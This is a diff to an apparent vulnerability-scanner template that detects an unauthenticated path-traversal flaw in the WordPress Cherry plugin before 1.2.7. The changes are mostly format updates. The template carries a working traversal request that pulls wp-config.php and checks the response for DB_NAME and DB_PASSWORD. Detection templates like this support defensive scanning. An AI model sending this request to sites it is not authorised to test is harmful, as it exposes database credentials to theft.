@@ -1,4 +1,5 @@
 id: cherry-lfi
+
 info:
   name: WordPress Cherry < 1.2.7 - Unauthenticated Arbitrary File Upload and Download
   author: dhiyaneshDK
@@ -11,11 +12,15 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
     cvss-score: 8.6
     cwe-id: CWE-22
-  tags: wordpress,wp-plugin,lfi,wp
-requests:
+  metadata:
+    max-request: 1
+  tags: wpscan,wordpress,wp-plugin,lfi,wp
+
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php'
+
     matchers-condition: and
     matchers:
       - type: word
@@ -24,8 +29,9 @@ requests:
           - "DB_NAME"
           - "DB_PASSWORD"
         condition: and
+
       - type: status
         status:
           - 200
 
-# Enhanced by mp on 2022/04/21
+# digest: 490a0046304402201f5a66078e337992fdb18f2a7e35cbd8e42f4f0bc30c3e4a3cf7ec7932c860b8022037ba1375b0c76f635e3ec9005f13c3ffeb7d06edf47761016391d6aaf0ec6600:922c64590222798bb761d5b6d8e72950
